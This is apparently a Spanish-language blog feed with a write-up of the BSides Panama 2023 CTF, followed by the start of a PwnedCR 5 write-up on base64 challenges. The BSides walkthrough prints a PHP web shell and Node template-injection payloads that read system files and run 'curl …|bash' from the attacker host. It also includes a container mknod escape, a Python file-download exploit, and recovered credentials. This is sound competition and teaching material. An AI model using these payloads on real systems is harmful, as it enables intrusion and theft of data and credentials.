&lt;h1 id=&quot;archivo-de-respaldo-webserver&quot;&gt;Archivo de respaldo (WebServer):&lt;/h1&gt;

&lt;p&gt;Iniciamos el CTF, nos dan √∫nicamente la VPN, as√≠ que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra direcci√≥n IP la m√°scara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Teniendo esta red podemos empezar a buscar hosts con el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -sP 10.1.1.1-255
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a&gt;-sp&lt;/a&gt; ‚Äì&amp;gt; Habilita la funci√≥n de pingsweep.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos notar que encontr√≥ un host.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Manos a la obra, vamos a realizar un escaneo m√°s profundo con el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos encontr√≥ los siguientes puertos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Empezamos enumerando los puertos del servicio Web.&lt;/p&gt;

&lt;p&gt;Utilizando el comando &lt;a&gt;whatweb&lt;/a&gt; podemos ver que estamos ante un CentOS y m√°s informaci√≥n sobre la p√°gina Web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/5.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigando notamos que hay dos servicios Web en los puertos &lt;a&gt;80&lt;/a&gt; y &lt;a&gt;65400&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;servicio-web-en-el-puerto-80&quot;&gt;Servicio Web en el puerto 80:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/6.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al utilizar fuzzing contra esta p√°gina podemos encontrar un archivo &lt;a&gt;notes.txt&lt;/a&gt; el cual contiene informaci√≥n que nos puede ser √∫til m√°s adelante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/7.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y adem√°s encontramos una ruta &lt;a&gt;/wordpress&lt;/a&gt; la cual contiene una p√°gina en WordPress.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/8.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;servicio-web-en-el-puerto-65400&quot;&gt;Servicio Web en el puerto 65400:&lt;/h1&gt;

&lt;p&gt;Nos encontramos con una p√°gina normal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/9.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viendo la p√°gina Web encontramos un par de credenciales en un post.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos las credenciales contra el panel de administraci√≥n y estamos dentro como admin.&lt;/p&gt;

&lt;p&gt;En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la m√°quina.&lt;/p&gt;

&lt;p&gt;El archivo que subimos fue el siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&apos;cmd&apos;]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Al abrir la imagen(&lt;strong&gt;que en realidad es el archivo php malicioso&lt;/strong&gt;) y colocar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?cmd=whoami&lt;/code&gt; podemos ejecutar comandos y tambi√©n ganar acceso al sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/11.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Creamos un index.html en nuestra m√°quina de atacante para hacer la reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despu√©s compartimos el index.html con python3 y nos ponemos en escucha con &lt;a&gt;netcat&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/13.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para obtener la reverse shell nos falta hacer lo siguiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/14.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estamos dentro como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;, hacemos tratamiento de la TTY y listo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/15.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumeramos el sistema y con &lt;a&gt;ss -nat&lt;/a&gt; nos damos cuenta de que hay un puerto que no pod√≠amos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en &lt;a&gt;notes.txt&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/16.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Realizamos un t√∫nel con &lt;a&gt;chisel&lt;/a&gt; para tener acceso a ese puerto desde nuestra m√°quina.&lt;/p&gt;

&lt;p&gt;En nuestra m√°quina lo ponemos as√≠: (&lt;strong&gt;Servidor&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/17.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la sesi√≥n de www-data lo ponemos de la siguiente manera: (&lt;strong&gt;Cliente&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/18.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos dirigimos a nuestro navegador y podemos colocar &lt;a&gt;127.0.0.1:8080&lt;/a&gt; y nos aparecer√° el servicio que vimos en &lt;a&gt;notes.txt&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/19.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si le ponemos el argumento &lt;a&gt;/?q=&lt;/a&gt; y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un &lt;a&gt;7*7&lt;/a&gt; el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS):&lt;/p&gt;

&lt;p&gt;&lt;a&gt;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/20.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para probarlo m√°s podemos utilizar el siguiente payload:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{root.process.mainModule.require(&apos;child_process&apos;).spawnSync(&apos;cat&apos;, [&apos;/etc/passwd&apos;]).stdout}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y en efecto nos devuelve el &lt;a&gt;/etc/passwd&lt;/a&gt;, pero no de la m√°quina en la cual tenemos acceso con &lt;strong&gt;www-data&lt;/strong&gt; es otra m√°quina, investigando un poco m√°s nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{root.process.mainModule.require(&apos;child_process&apos;).spawnSync(&apos;cat&apos;, [&apos;/root/backup.sql&apos;]).stdout}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/21.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Obtenemos la flag y un usuario y contrase√±a la cual son:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1

Decodificamos el sha256 y obtenemos lo siguiente:

admin:R@scal
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;acceso-usuario-webserver&quot;&gt;Acceso usuario (WebServer):&lt;/h1&gt;

&lt;p&gt;Podemos utilizar estas credenciales para entrar al servidor por ssh.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/22.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Adem√°s podemos ver la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/23.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;acceso-administrativo-webserver-ruta-alternativa&quot;&gt;Acceso administrativo (WebServer): (ruta alternativa)&lt;/h1&gt;

&lt;p&gt;Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{root.process.mainModule.require(&apos;child_process&apos;).exec(&apos;curl 172.16.80.42|bash&apos;)}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tenemos que tener todo &lt;strong&gt;exactamente igual&lt;/strong&gt; que cuando ganamos acceso con al WebShell.&lt;/p&gt;

&lt;p&gt;Hacemos el tratamiento de la TTY y listo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/24.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estamos como root y en la direcci√≥n IP &lt;a&gt;172.17.0.2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Enumeramos el contenedor y encontramos que podemos utilizar la siguiente informaci√≥n para leer archivos del sistema como usuario privilegiado:&lt;/p&gt;

&lt;p&gt;&lt;a&gt;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a&gt;https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames&lt;/a&gt; (La parte de escalada de privilegios)&lt;/p&gt;

&lt;p&gt;Podemos explotar la capabilitie mknod del contenedor:&lt;/p&gt;

&lt;p&gt;En el contenedor ejecutamos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /
mknod sda b 8 0
chmod 777 sda
echo &quot;admin:x:1000:1000:admin,,,:/home/admin:/bin/bash&quot; &amp;gt;&amp;gt; /etc/passwd
su admin --&amp;gt; Ejecutando este comando deber√≠amos pasar al usuario node
/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/25.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la m√°quina v√≠ctima como usuario admin ejecutamos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps -auxf | grep /bin/bash --&amp;gt; Para saber cu√°l es el PID.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/26.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que tenemos el PID en este caso &lt;a&gt;2676&lt;/a&gt; nos falta obtener la flag:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -a &quot;root -&quot; /proc/2676/root/sda --&amp;gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando:

strings /proc/2676/root/sda | grep -a &quot;root -&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obtenemos la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/27.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;wordpress-webserver-ruta-alternativa&quot;&gt;WordPress (WebServer): (ruta alternativa)&lt;/h1&gt;

&lt;p&gt;Hay m√∫ltiples maneras de obtener esta flag, pero se me hizo muy f√°cil de esta manera:&lt;/p&gt;

&lt;p&gt;Tenemos acceso como root a mysql sin proporcionar contrase√±a:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql -uroot -p --&amp;gt; Cuando nos pide un password presionamos enter.

show databases; 

use wordpress;

select * from wp_posts where post_status=&apos;trash&apos;; --&amp;gt; Podemos ver posts que han sido borrados.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En WordPress, la papelera se gestiona en la base de datos de WordPress, espec√≠ficamente en la tabla &lt;a&gt;wp_posts&lt;/a&gt;, cuando se elimina una publicaci√≥n, su estado se cambia a papelera en la columna &lt;a&gt;post_status&lt;/a&gt; de la &lt;a&gt;tabla wp_posts&lt;/a&gt;, y permanece all√≠ hasta que se elimine permanentemente o se restaure. La tabla wp_posts tambi√©n contiene columnas para el t√≠tulo, el contenido, el autor y otra informaci√≥n meta de la publicaci√≥n.&lt;/p&gt;

&lt;p&gt;Podemos ver la flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/28.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;passwordtxt-webserver2&quot;&gt;Password.txt (WebServer2)&lt;/h1&gt;

&lt;p&gt;Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no pod√≠amos descubrirlo atrev√©s de ping, pero si pudimos encontrarlo gracias a los puertos.&lt;/p&gt;

&lt;p&gt;Ahora que sabemos que direcci√≥n IP tiene podemos hacer un escaneo m√°s profundo con &lt;a&gt;nmap&lt;/a&gt; y podemos encontrar los siguientes puertos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/29.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Empezamos enumerando el puerto &lt;strong&gt;8080&lt;/strong&gt;, y aplicamos fuzzing con el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Despu√©s de esperar un buen rato podemos ver este directorio datos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/30.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto es lo que contiene el directorio:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/31.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscamos en internet ‚Äú&lt;a&gt;iotransfer windows exploit&lt;/a&gt;‚Äù nos topamos con este art√≠culo:&lt;/p&gt;

&lt;p&gt;&lt;a&gt;https://www.exploit-db.com/exploits/50974&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el c√≥digo, en mi caso no sirvi√≥ por un problema de incompatibilidad con la librer√≠a win32com, as√≠ que revisando el c√≥digo podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aqu√≠ esta el c√≥digo: (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Funcional en Linux&lt;/code&gt;)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/python3

import requests, json

remoteDownloadPath = r&apos;C:\Users\frank\Desktop\password.txt&apos;
IP = &quot;&quot;
localDownloadPath =&quot;./password.txt&quot;

def CreateDownloadTask(IP, Path) -&amp;gt; str:
    url = f&apos;http://{IP}:7193/index.php?action=createtask&apos;
    task = {
        &apos;method&apos;: &apos;get&apos;,
        &apos;version&apos;: &apos;1&apos;,
        &apos;userid&apos;: &apos;*&apos;,
        &apos;taskstate&apos;: &apos;0&apos;,
        &apos;filepath&apos;: Path
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task[&apos;content&apos;])
    taskid = task[&apos;taskid&apos;]
    print(f&quot;TaskID: {taskid}&quot;)
    return taskid

def ExploitDownload(IP, DownloadPath, ID=None):
    if ID:
        url = f&apos;http://{IP}:7193/index.php?action=downloadfile&amp;amp;userid=*&amp;amp;taskid={ID}&apos;
    else:
        taskid = CreateDownloadTask(IP, DownloadPath)
        url = f&apos;http://{IP}:7193/index.php?action=downloadfile&amp;amp;userid=*&amp;amp;taskid={taskid}&apos;
    res = requests.get(url)
    return 

if __name__ == &apos;__main__&apos;:
        print(f&quot;[*] Downloading the file: {remoteDownloadPath}&quot;)
        res = ExploitDownload(IP, remoteDownloadPath)
        file = open(localDownloadPath, &quot;wb+&quot;)
        file.write(res.content)
        file.close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo ejecutamos y obtenemos lo siguiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/bsides-panama-2023/32.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;acceso-usuario-webserver2&quot;&gt;Acceso usuario (WebServer2):&lt;/h1&gt;

&lt;p&gt;Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(&lt;strong&gt;10.1.1.100&lt;/strong&gt;) y webserver2(&lt;strong&gt;10.1.1.150&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para conectarnos podemos utilizar: &lt;a&gt;xfreerdp&lt;/a&gt; o &lt;a&gt;remmina&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 despu√©s de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio.&lt;/p&gt;

&lt;h1 id=&quot;acceso-administrativo-webserver2&quot;&gt;Acceso administrativo (WebServer2):&lt;/h1&gt;

&lt;p&gt;Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Est√° corriendo los servicios Web en los puertos 8080 y 8081&lt;/code&gt;), nos dirigimos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\xampp2\htdocs\&lt;/code&gt; y subimos una reverse shell para despu√©s ejecutarla desde la p√°gina web y si vemos quien la esta ejecutando es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WEBSERVER\Administrator&lt;/code&gt; as√≠ que ya podemos buscar la flag del administrador.&lt;/p&gt;

&lt;h1 id=&quot;plataforma-web-webserver2-ruta-alternativa&quot;&gt;Plataforma WEB (WebServer2) (ruta alternativa):&lt;/h1&gt;

&lt;p&gt;Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos.&lt;/p&gt;

&lt;p&gt;Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprend√≠ muchas cosas.&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry><entry><title type="html">Pwnedcr 5</title><link href="http://localhost:4000/pwnedcr-5.html" rel="alternate" type="text/html" title="Pwnedcr 5" /><published>2022-12-08T00:00:00-06:00</published><updated>2022-12-08T00:00:00-06:00</updated><id>http://localhost:4000/pwnedcr-5</id><content type="html" xml:base="http://localhost:4000/pwnedcr-5.html">&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/pwnedcr-5.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;retos&quot;&gt;Retos:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;El regalo&lt;/li&gt;
  &lt;li&gt;Cryptonita&lt;/li&gt;
  &lt;li&gt;Tron&lt;/li&gt;
  &lt;li&gt;Enum√©rame&lt;/li&gt;
  &lt;li&gt;Bruto el fuerte&lt;/li&gt;
  &lt;li&gt;Siete a cero&lt;/li&gt;
  &lt;li&gt;Scripteando&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;el-regalo&quot;&gt;El regalo:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/1.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dan una cadena de caracteres que se parece a una cadena encodeada en base64.&lt;/p&gt;

&lt;p&gt;Sabiendo esto, podemos intentar de decodificarlo desde una terminal de la siguiente manera:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;UFdORURDUnt2ZW5pbW9zX2VuX3Bhel9naGVpQDkwJCN9&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;De esta manera obtenemos la flag: &lt;strong&gt;PWNEDCR{venimos_en_paz_ghei@90$#}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;De una manera alternativa podemos ir a la siguiente pagina &lt;a href=&quot;https://www.base64decode.org/&quot; title=&quot;Base64 decoder&quot;&gt;Link&lt;/a&gt; y pegamos nuestra cadena para decodificarla.&lt;/p&gt;

&lt;h1 id=&quot;cryptonita&quot;&gt;Cryptonita:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que esta vez no nos dan una cadena, pero si leemos de manera detenida podemos ver una pista, la cual es: ‚Äúse cree que en √©sta p√°gina se esta intercambiando informaci√≥n‚Äù, esto nos puede decir que la flag puede esta en el codigo fuente de la pagina.&lt;/p&gt;

&lt;p&gt;Vamos a ver el codigo fuente y en efecto vemos algo fuera de lo comun casi al final de la pagina, una cadena parecida a la del reto anterior pero esta vez es mucho mas larga.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a tratar de decodificarlo‚Ä¶&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Tm9zIGVzdOFuIHNpZ3VpZW5kbyBlbCByYXN0cm8sIGhheSBxdWUgYm9ycmFyIHRvZGEgaW5mb3JtYWNp824gYW50ZXMgZGUgcXVlIHNlYSBkZW1hc2lhZG8gdGFyZGUsIGxhcyBjdWVudGFzIGVuIGxvcyBvdHJvcyBwYe1zZXMgZnVlcm9uIGJsb3F1ZWFkYXMsIGxvIPpuaWNvIHF1ZSBub3MgcXVlZGEgZXMgZWwgd2FsbGV0IGRlIGNyeXB0byBtb25lZGFzIHF1ZSBzb2xvIHVzdGVkZXMgeSB5byBzYWJlbW9zIGRvbmRlIGVzdOEsIHJlY3VlcmRlbiB1dGlsaXphciBsYSBwYWxhYnJhIGRlIHBhc28gcGFyYSBwb2RlciBzYWJlciBudWVzdHJvIHBy83hpbW8gcHVudG8gZGUgcmV1bmnzbjogW1sgVUZkT1JVUkRVbnR6WldOMGIzSmZORjloY0dGeWRHRnRaVzUwYjE4Mk5WOTZiMjVoWDI1MVkyeGxZWEpmWkdWellXeHZhbUZrWVY4MUpETXlRREY5IF1d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos un mesage curioso y otra cadena que tambien se parece mucho a una cadena en base64, vamos a decodificarla:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;UFdORURDUntzZWN0b3JfNF9hcGFydGFtZW50b182NV96b25hX251Y2xlYXJfZGVzYWxvamFkYV81JDMyQDF9&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Con esto ya podemos ver la flag: &lt;strong&gt;PWNEDCR{sector_4_apartamento_65_zona_nuclear_desalojada_5$32@1}&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;tron&quot;&gt;Tron:&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/pwnedcr5/5.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

